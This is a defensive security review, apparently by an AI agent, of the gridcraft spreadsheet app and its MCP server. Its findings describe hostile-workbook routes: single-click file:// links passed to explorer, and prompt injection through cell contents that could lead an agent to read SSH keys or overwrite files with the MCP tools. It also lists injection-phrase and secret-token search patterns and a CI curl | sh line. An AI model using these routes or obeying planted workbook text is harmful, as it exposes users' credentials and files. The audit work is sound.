# gridcraft security review

- Commit reviewed: 51b531be3e8b3f5a19d2b7714a4780a79569ca92 (2026-10-09 09:20:56 -0400, "Merge pull request #13 from XusBadia/dmg-background"). Same commit as the automated full scan `reports/2026-10-09/gridcraft-full.md`.
- Review type: read-only static review by AI agent, 2026-10-09
- Verdict: CLEAN WITH NOTES
- Build-gate recommendation: APPROVE. There is no outbound network code, no telemetry and no HTTP/TLS stack in the lockfile, and the build scripts only write to `OUT_DIR`. The one external contributor's commit is macOS DMG artwork plus a packaging script. Read GRID-01 (single-click hyperlinks go to `explorer`) before opening untrusted workbooks, and GRID-02/03 before enabling `--control` or the MCP server.

## Summary

- 25 commits: 24 by maintainer "Brandon Thomas" (echelon@gmail.com, shared2@storyteller.ai) and 1 by external contributor **Xus Badia** (`be33eba`, PR #13). I read that diff in full: a DMG background TIFF, a `.DS_Store` layout, an SVG source, a Python generator and 5 lines of `packaging/macos/package.sh`. None of it is build, CI, network or MCP code (GRID-06).
- **No outbound network code.** The only sockets are the opt-in loopback listener (`--control PORT` / `GRIDCRAFT_CONTROL_PORT`) and the `TcpStream` client in `gridcraft-cli mcp --connect`. The lockfile has no reqwest, ureq, hyper, rustls, openssl or curl. `tokio` appears only as a `pin-project-lite`-only dependency of `wasm-bindgen-futures`. `zbus`/`async-io` come from `accesskit_unix`/`atspi` (Linux D-Bus accessibility; local IPC).
- **Formula engine cannot reach the network or disk:** `WEBSERVICE` and `FILTERXML` are stubs that return `#VALUE!` (`crates/functions/src/info.rs:422-423`). `HYPERLINK()` only returns text. `INFO()` returns constants (`"directory" => "/"`, `"osversion" => "GridCraft"`). `CELL("filename")` returns an empty string. VBA projects are dropped and external workbook links are ignored with a warning (`crates/xlsx/src/read.rs:276-281`).
- **Main document risk (GRID-01):** a plain left click on a cell hyperlink spawns `explorer <target>` on Windows (`open`/`xdg-open` elsewhere) for any target containing `://` or starting with `mailto:`. There is no scheme allow-list and no confirmation. This is easier to trigger than WordCraft's WC-01, which needs Ctrl+click.
- Control port and MCP follow the sibling-app design: an unauthenticated loopback JSON-lines channel (GRID-02). Through `execute_command`, MCP can reach `file.open` (reads **any** file as CSV, whatever its extension), `data.getData {path}`, `file.save`/`exportPdf`/`print` (write to any path) and `screenshot {path}` (GRID-03). MCP tool metadata is clean (no poisoning).
- Supply chain is clean: 432 lockfile packages (416 crates.io packages, all with checksums, plus 16 workspace crates). There are no `git =`, `[patch]`, `[replace]` or out-of-tree path dependencies. Only the maintainer changed dependencies.
- The scanner's MEDIUM items are CI-only and benign (GRID-05): `sign.ps1:66` decodes the signing certificate from a secret, and the FreeBSD VM job runs rustup `curl | sh`.

## Inventory

- Workspace: `members = ["crates/*", "apps/*", "xtask"]`, `default-members = ["crates/*", "apps/gridcraft", "apps/gridcraft-cli", "xtask"]`, version 0.3.0, edition 2024, `rust-version = "1.90"`, `unsafe_code = "forbid"`. 144 `.rs` files, about 66k lines.
- Apps: `gridcraft` (egui desktop GUI), `gridcraft-cli` (`eval`, `run`, `snapshot`, `send`, `mcp`, ...), and `gridcraft-web` (eframe/wasm via trunk, not part of a native build).
- Crates (12): `core, numfmt, formula, functions, model, calc, xlsx, chart, engine, ui-egui, mcp, pdf`, plus `xtask`.
- Build scripts (2, both read): `apps/gridcraft/build.rs` and `crates/ui-egui/build.rs`. There are no proc-macro crates in the workspace.
- `.cargo/config.toml`: only `[alias] xtask = "run --package xtask --"`. There is no rust-toolchain file.
- Workflows (4): `release.yml`, `windows-arm64.yml`, `freebsd.yml` (release branch / dispatch only) and `packaging-lint.yml` (push/PR, lint only, no secrets).
- Packaging: `packaging/windows/{package.ps1,sign.ps1,gridcraft.wxs}` (no WiX CustomAction), `packaging/linux/*` (nfpm, AppImage, Flatpak; `postinst.sh` only refreshes desktop/MIME/icon caches), `packaging/macos/*` (empty entitlements), `packaging/web/*`, and `packaging/freebsd/package.sh`.
- Checked-in binaries: no PE, ELF, Mach-O, wasm, dll, so or jar files. Assets are PNG/ICO/ICNS/SVG icons, `packaging/macos/dmg/background.tiff` (valid `II*` TIFF) and `dmg-layout.DS_Store` (valid `Bud1`; strings show only the view settings and the alias `/Volumes/GridCraft/.background/background.tiff`).
- `include_bytes!` in non-test code: only the app icon PNG (`apps/gridcraft/src/main.rs:130`).
- Vendored code: none. Plugins/scripting: none. Macros (VBA) are dropped on load.
- Agent files: `AGENTS.md` and `CLAUDE.md`. There is no `.mcp.json`, `.claude/` or `.vscode/`.

## Network and data-egress map

| Location | Purpose | Trigger | Destination / bind | Data sent | Auth | Assessment |
|---|---|---|---|---|---|---|
| `apps/gridcraft/src/control_server.rs:15` `TcpListener::bind(("127.0.0.1", port))` | JSON-lines automation channel | Only with `--control PORT` or env `GRIDCRAFT_CONTROL_PORT` (`main.rs:141`) | 127.0.0.1:PORT, loopback only | Replies with workbook data, command results, screenshots | None; raw TCP, so no Host/Origin check | MEDIUM, GRID-02 |
| `crates/mcp/src/backend.rs:46-48` `to_socket_addrs` + `TcpStream::connect_timeout` | MCP server to running app | Only `gridcraft-cli mcp --connect PORT|HOST:PORT` | User-supplied address (docs: 7979) | MCP tool calls | None | Benign client |
| `apps/gridcraft/src/main.rs:115-123` `Command::new("explorer"/"open"/"xdg-open").arg(url).spawn()`, called from `crates/ui-egui/src/grid.rs:1184-1190,1484-1488` | Follow a cell hyperlink | **Single left click** (no modifier) on the left 80% of a hyperlink cell; also the raw control method `ui.cell.click` | **Whatever string the workbook holds**, if it contains `://` or starts with `mailto:` | None sent by the app | n/a | MEDIUM, GRID-01 |
| `apps/gridcraft/src/native_menu.rs:174-175`, `crates/ui-egui/src/dialogs.rs:922-923`, `credits.rs:259,282` | Help/About links: getartcraft.com, discord.gg/artcraft, github.com/{login} | User click | Browser | None | n/a | INFO, known-good |
| `apps/gridcraft-web/src/web.rs:115-117` `window.open_with_url_and_target(url, "_blank")` | Hyperlinks in the web build | Click | Browser tab | None | n/a | INFO (web build only) |
| `crates/xlsx/src/sheet_read.rs:627-651` | Reads hyperlink rels (`TargetMode="External"`) | On open | **No fetch**: kept as strings only | none | n/a | OK |
| `crates/xlsx/src/read.rs:276-281` | vbaProject / externalLink parts | On open | Not loaded; warning only | none | n/a | OK |
| `.github/workflows/*`, `packaging/windows/sign.ps1` | CI tool downloads (rustup, nfpm, trunk, actionlint, flatpak) | CI only | github.com, sh.rustup.rs, nuget.org, flathub | none | n/a | LOW, GRID-05 |

There is no telemetry, analytics, crash upload, update check, license check, remote config, fingerprinting, or model/font/asset download. Font loading reads only local system font directories (`crates/ui-egui/src/theme.rs:172-200`, which uses `HOME`/`WINDIR` only to build font paths). Spelling reads `/usr/share/dict/*` (`crates/engine/src/cmd/spelling.rs:26`). Preferences are `ui.json`/`prefs.json` under `%APPDATA%\GridCraft` (Windows), `~/Library/Application Support/GridCraft` (macOS) or `$XDG_CONFIG_HOME/GridCraft` (`apps/gridcraft/src/main.rs:53-91`).

## Findings

**GRID-01** · **MEDIUM** · Document attack surface: hyperlink follow on a single click, no scheme filtering · `crates/ui-egui/src/grid.rs:1183-1190`, `crates/ui-egui/src/grid.rs:1484-1488`, `apps/gridcraft/src/main.rs:115-123`, `crates/xlsx/src/sheet_read.rs:631`
Evidence: `// A click on a hyperlink's text follows it (like Excel); elsewhere in the cell selects.` ... `if target.contains("://") || target.starts_with("mailto:") { if let Some(f) = &app.services.open_url { f(target); } }`, then `} else if cfg!(windows) { "explorer" } ... std::process::Command::new(cmd).arg(url).spawn();`. The target is the raw relationship `Target` from the workbook (`rels.iter().find(|r| r.id == id).map(|r| r.target.clone())`).
- A hostile .xlsx can carry `file://host/share/x.exe`, `file:///C:/...`, or a custom-protocol URI that contains `://`. One ordinary click on the cell (the normal way to select it) passes it to `explorer.exe`, with no confirmation and no allow-list. This is weaker protection than WordCraft (WC-01 needs Ctrl+click) and weaker than Excel, which warns about non-http links.
- Speculation (not tested): on Windows, `explorer file://attacker/share/...` triggers an SMB connection (NTLM hash leak) and may launch the target subject to Windows' own security prompt. No shell is involved (`Command::arg`), so this is not a shell-injection bug, but explorer's own argument parsing of a crafted string was not verified.
- Agent angle: MCP tools do not expose `ui.cell.click`, but the raw control channel does (`crates/ui-egui/src/control.rs:295-299`). Formula `HYPERLINK()` cells are **not** clickable; only stored sheet hyperlinks are.
Recommendation: do not click hyperlink cells in untrusted workbooks; click the row/column header or use the keyboard to select them. Upstream fix: allow only `http`, `https` and `mailto`, ask before opening, and require Ctrl+click as Excel does by default for external links.

**GRID-02** · **MEDIUM** · Unauthenticated automation channel · `apps/gridcraft/src/control_server.rs:15,28-66`, `crates/ui-egui/src/control.rs:150-330`
Evidence: `TcpListener::bind(("127.0.0.1", port))`; each line is parsed as JSON and dispatched. `"engine.execute" | "command" | "ui.menu.invoke"` runs **any** command id via `app.run(id, params)`, and there are also `app.open {path}`, `app.save {path}`, `ui.screenshot {path}`, `ui.click`/`ui.cell.click`, `ui.key`/`ui.text`, and `app.quit`.
- It is loopback-only and opt-in (`--control` or `GRIDCRAFT_CONTROL_PORT`; a persistent env var would silently enable it). There is no token. Invalid JSON lines get an error reply but do not close the connection. Speculation (not tested): a web page could POST a body whose last line is valid JSON, and that line would execute blind, the same as WC-02/CAD-01. Any local process can connect.
- Reachable capabilities are the file read/write primitives in GRID-03 and the hyperlink spawn in GRID-01 (via `ui.cell.click`). No command runs any other process or reaches the network.
Recommendation: only start with `--control` while an agent is working, do not set `GRIDCRAFT_CONTROL_PORT` globally, and avoid browsing untrusted pages meanwhile. Upstream: per-launch token, and reject lines that start with an HTTP method.

**GRID-03** · **MEDIUM** · MCP tools with broad file access; prompt-injection channel · `crates/mcp/src/tools.rs:112-127,329-342,359-365,437,559`, `crates/engine/src/cmd/file.rs:35-49,64-75,110-123`, `crates/engine/src/io.rs:36-65,80-90,159-175`, `crates/engine/src/cmd/extra.rs:673-678`, `crates/engine/src/cmd/insert.rs:698-703`, `crates/engine/src/cmd/print.rs:1313-1331`
- **Arbitrary file read:** `file.open {path}` (MCP `open_workbook`, or `execute_command`) calls `read_file(path)` with no extension check. `open_bytes` parses anything that is neither xlsx-sniffed nor json/tsv as **CSV** (the `_ =>` arm), so e.g. `~/.ssh/id_ed25519` or `.git-credentials` opens as a sheet, and `read_range` returns it verbatim to the model. `data.getData {path}` (`extra.rs:677`) does the same. `insert.picture {path}` reads any file (up to 64 MB) and stores it as an image.
- **Arbitrary file write/overwrite:** `file.save`/`saveAs`/export (`save_workbook {path}`) write to any path; the format follows the extension (`.csv`/`.txt`/`.tsv` give cell-controlled text, `.html`, `.json`, otherwise xlsx). The write goes to `{path}.sctmp` and is then renamed over the target. `file.exportPdf {path}` and `file.print {path}` write PDF bytes to any path and extension. `screenshot {path}` writes a PNG anywhere.
- The tool metadata understates these effects: `screenshot` has `readOnlyHint: true` and every tool has `destructiveHint: false`, including `save_workbook` and `execute_command` (`tools.rs:63`).
- Every cell value, comment, defined name, document property and hyperlink is returned verbatim by `read_range`/`get_cell`/`inspect_workbook`, so a hostile workbook can inject instructions into the agent, which then has the file tools above.
Recommendation: keep per-call approval for `execute_command`, `open_workbook`, `save_workbook` and `screenshot`; do not auto-approve `mcp__gridcraft__*`; open only trusted workbooks in agent sessions. Upstream: an extension allow-list for `file.open`/`data.getData`, and correct the `readOnlyHint`/`destructiveHint` annotations.

**GRID-04** · **INFO** · Agent instruction files · `AGENTS.md`, `CLAUDE.md`
They contain ordinary developer-agent workflow guidance: read `plan/STATUS.md`, follow `../../craftrules`, "Don't stop to ask unless §7 lists the decision as the user's", and run `python3 ../../craftrules/scripts/contributors.py` when crediting a contributor. Nothing targets reviewers, users or MCP clients, and nothing asks to exfiltrate data or hide actions. There is no injection phrasing anywhere in the repo (sweep for `ignore previous`, `do not tell`, `secretly`, `system prompt`, `<IMPORTANT>`, and similar). There are no bidi or zero-width Unicode characters in tracked files. Note that the instructions point dev agents at a script outside this repo (`craftrules`), which this review did not cover.

**GRID-05** · **LOW** · CI/dev download hygiene (scanner MEDIUM items) · `packaging/windows/sign.ps1:66`, `.github/workflows/freebsd.yml:75`, `release.yml:84,87,143,146,211,212,298,301,348`
`sign.ps1:66` `[IO.File]::WriteAllBytes($pfx, [Convert]::FromBase64String($env:WINDOWS_CERTIFICATE))` writes the code-signing PFX from a secret in the signing job. It is expected and is not a download/execute LOLBIN. `freebsd.yml:75` runs rustup `curl -fsSL https://sh.rustup.rs | sh` inside the FreeBSD VM, which is CI-only. `dtolnay/rust-toolchain@stable` and `Swatinem/rust-cache@v2` are unpinned in `release.yml` (SHA-pinned in `windows-arm64.yml`). Mitigations: release workflows trigger only on `push` to `release` or `workflow_dispatch`; there is no `pull_request_target`; secrets are confined to the `release` environment; `GH_TOKEN` is used only by the final draft-release job. None of this runs on the user's machine during a local build.

**GRID-06** · **INFO** · External contributor review: `be33eba` (Xus Badia, PR #13, merged as `51b531b`). Assessed OK; see History.

## Build-time execution review

- `apps/gridcraft/build.rs`: returns immediately unless the target OS is Windows. On Windows it calls `winresource` to embed `assets/app-icon/gridcraft.ico` plus constant VERSIONINFO strings. It reads env `CARGO_CFG_TARGET_OS` and `GRIDCRAFT_REQUIRE_WINRES`. There is no network and no other process (winresource invokes the SDK resource compiler). OK.
- `crates/ui-egui/build.rs`: reads `contributors/contributors.json` and `contributors/people.toml` (in-repo) and writes `OUT_DIR/credits.rs` with static tables. All strings are emitted with `{:?}` (Rust-escaped), so JSON/TOML content cannot inject code into the generated file. There is no network and no process. OK.
- Proc-macros: none in the workspace.
- `xtask` (dev only, not run by the nightly build): spawns `$CARGO`/`cargo` (`xtask/src/main.rs:71`) and `git ls-files` (`xtask/src/assets.rs:40`), and generates the parity report. Its only dependencies are `serde_json` and optional `gridcraft-engine`. OK.
- `.cargo/config.toml`: alias only. There is no `[env]`, runner, linker, rustflags or source replacement.

## Agent and MCP surface review

- Launch: `gridcraft-cli mcp` gives a headless, in-process engine over **stdio** JSON-RPC. `gridcraft-cli mcp --connect PORT|HOST:PORT` bridges to a running `gridcraft --control PORT` over loopback TCP (`apps/gridcraft-cli/src/main.rs:482-512`). Docs: `claude mcp add gridcraft -- gridcraft-cli mcp` (`docs/mcp.md:17-19`).
- Control channel: `127.0.0.1` only, no token, newline-delimited JSON, 64 MiB line cap, 60 s UI timeout (GRID-02).
- Tools (20): `execute_command, list_commands, inspect_workbook, read_range, write_range, set_cell, get_cell, evaluate_formula, select, format_range, insert_chart, create_table, sort_range, filter, open_workbook, save_workbook, new_workbook, undo, redo, screenshot, list_functions` (`crates/mcp/src/tools.rs:109-376`). I read the descriptions and schemas verbatim. They are purely functional with no hidden instructions, no cross-tool directives and no `<IMPORTANT>` blocks. `"openWorldHint": false` on all tools is accurate, since there is no network.
- The MCP bridge only sends `engine.execute`, `engine.commands` and `ui.screenshot` (`tools.rs:437,559,573`), so it cannot drive pointer clicks (and therefore GRID-01) through MCP.
- Capability risks: arbitrary file read and write via commands (GRID-03), and workbook content flowing back to the model verbatim. There is no process execution or network access through MCP.

## Contributor and history review

- 25 commits, all 2026-10-05..2026-10-09. 24 by "Brandon Thomas" (two e-mails) and 1 external (Xus Badia `<xus@badia.me>`). No history rewrite is evident: one linear history plus one merge, and the scan commit equals HEAD.
- Dependency changes (`Cargo.toml`/`Cargo.lock`): only by Brandon Thomas (`1ba9daa`, `beb3539`, `b6ae966`, `168b8ec`, `488e12d`, `39082d1`, `a3cbb9b`, `fb82389`).
- `be33eba`: Xus Badia: adds `packaging/macos/dmg/{background.svg, background.tiff, dmg-layout.DS_Store, generate.py, README.md}`, and in `package.sh` copies the TIFF/DS_Store into the DMG staging folder and drops the version from the volume name. I read the diff in full. `generate.py` is a dev-run regeneration script (resvg, Pillow, ds_store, mac_alias) and is not run by any build or CI. The SVG has no script or event handlers; its only `href` is `../../../assets/app-icon/gridcraft.svg`. The TIFF and DS_Store magic and contents match their description. The commit message matches the diff. **OK.**

## Coverage checklist

1. Inventory: workspace, apps, crates, build scripts, proc-macros (none), cargo config, workflows, packaging, binaries (none executable). Done.
2. Network/egress: full sweep of `std::net`/HTTP clients/WebSocket/URL schemes/`0.0.0.0`/`open_url`. Only the loopback control server, the MCP TCP client and user-click link opening. No telemetry.
3. Process execution: `open_url` (`explorer`/`open`/`xdg-open`, GRID-01), xtask `cargo`/`git` (dev), test harness. Nothing else.
4. FS/OS abuse: no secret-store paths, persistence, hooks, screen capture of other windows (screenshot is the app's own frame), dynamic loading or `unsafe` (`forbid`). File reads/writes are command-driven (GRID-03).
5. Obfuscation: no long base64/hex literals in `.rs`, no bidi or zero-width characters, `include_bytes!` only for the icon.
6. Build-time: both build.rs files read; no proc-macros; xtask read; cargo config alias only.
7. Supply chain: 416 crates.io packages with checksums; no git/patch/replace/registry overrides; no HTTP/TLS crates; tokio is a stub dependency of wasm-bindgen-futures; zbus comes from accesskit/atspi (Linux a11y).
8. CI/installers: release only on the `release` branch or dispatch; secrets in the `release` environment; no `pull_request_target`; `postinst.sh` only refreshes caches; WiX has no CustomAction; macOS entitlements are empty. GRID-05.
9. Agent attacks: tool metadata clean, AGENTS.md/CLAUDE.md benign (GRID-04), no repo `.mcp.json`/`.claude/`/`.vscode/`; capability notes in GRID-02/03.
10. Plugins/scripting: none. VBA is dropped, and WEBSERVICE/FILTERXML are stubs.
11. History: one external commit reviewed (GRID-06); dependency changes by the maintainer only.
12. Secrets: no `ghp_`, `github_pat_`, `xox`, `AKIA`, `sk-`, `AIza` or PEM private keys in tracked files.
13. Ordinary vulnerabilities: GRID-01 (single-click link), GRID-02 (unauthenticated loopback control), GRID-03 (path access). Zip reading is bounded (`MAX_PART` 512 MiB, `MAX_TOTAL` 1 GiB, `MAX_ENTRIES` 200k, `crates/xlsx/src/package.rs:11-15`). quick-xml does not expand external entities (no XXE). Hyperlink cells are capped (`MAX_HYPERLINK_CELLS`). HTML export escapes cell text (`io.rs` `esc`).

## Known-good patterns (for the automated scanner allowlist)

- `apps/gridcraft/src/control_server.rs:15` `TcpListener::bind(("127.0.0.1", port))`: opt-in loopback control channel (default doc port 7979).
- `crates/mcp/src/backend.rs:4,48` `TcpStream::connect_timeout`: MCP `--connect` client to that port.
- `apps/gridcraft/src/main.rs:123` `Command::new(cmd).arg(url).spawn()` with `cmd` in `open|explorer|xdg-open`: link opener (see GRID-01 for the hardening issue).
- `xtask/src/main.rs:71` (`cargo`), `xtask/src/assets.rs:40` (`git ls-files`): dev only.
- `apps/gridcraft/build.rs`: winresource icon/VERSIONINFO. `crates/ui-egui/build.rs`: contributor tables from in-repo JSON/TOML into `OUT_DIR`.
- `crates/functions/src/info.rs:596-601`: `http://x.com` / `http://x` are test literals for HYPERLINK/WEBSERVICE.
- `README.md:214-221` `raw.githubusercontent.com/storytold/*` icon images: docs only.
- `packaging/linux/flatpak/ai.storyteller.gridcraft.yml:5`: comment showing how to fetch flatpak-cargo-generator; not executed.
- `packaging/windows/sign.ps1:66` PFX from the `WINDOWS_CERTIFICATE` secret: CI signing.
- `.github/workflows/freebsd.yml:75` rustup `curl | sh` inside the FreeBSD VM: CI only.
- `packaging/macos/dmg/{background.tiff,dmg-layout.DS_Store}`: DMG window assets (`be33eba`).

## Setup facts (for the install and build scripts)

- Cargo packages/binaries: GUI `gridcraft` (`gridcraft.exe`), CLI and MCP `gridcraft-cli` (subcommand `mcp`). `gridcraft-web` is wasm only.
- Windows release build: `cargo build --release --locked -p gridcraft -p gridcraft-cli` (as in `packaging/windows/package.ps1:65`).
- GUI launch: `gridcraft [--control PORT] [--sample budget|sales|grades] [files...]`. Env `GRIDCRAFT_CONTROL_PORT` also enables the control port. Prefs go in `%APPDATA%\GridCraft\{ui.json,prefs.json}` (disable with `GRIDCRAFT_NO_PREFS`).
- MCP: `gridcraft-cli mcp` is stdio and headless (in-process engine; `--in FILE` / `--sample NAME`). `gridcraft-cli mcp --connect 7979` is stdio and drives the running GUI started with `gridcraft --control 7979`.
- Windows prerequisites: MSVC toolchain plus the Windows SDK (`rc.exe` for winresource; a missing RC is only a warning unless `GRIDCRAFT_REQUIRE_WINRES` is set). There are no cmake/nasm/clang `-sys` requirements (pure Rust; wgpu uses system DX12/Vulkan).
- Linux build packages (from `release.yml:205-207`): `libxkbcommon-dev libwayland-dev libx11-dev libxrandr-dev libxi-dev libgl1-mesa-dev`.
- The control port has no token; choose a unique port and start it only when needed.
